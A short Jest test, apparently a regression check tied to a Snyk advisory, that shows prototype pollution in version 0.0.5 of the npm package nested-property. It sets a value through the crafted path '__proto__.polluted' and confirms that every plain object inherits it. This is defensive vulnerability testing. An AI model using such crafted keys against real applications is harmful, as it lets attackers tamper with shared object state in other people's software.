//https://snyk.io/test/npm/nested-property/0.0.5

test("prototype pollution in nested-property", () => {
  const nestedProperty = require("nested-property");
  const object1 = {};
  expect({}.polluted).toBe(undefined);
  nestedProperty.set(object1, "__proto__.polluted", "yes");

  expect({}.polluted).toBe("yes");
});
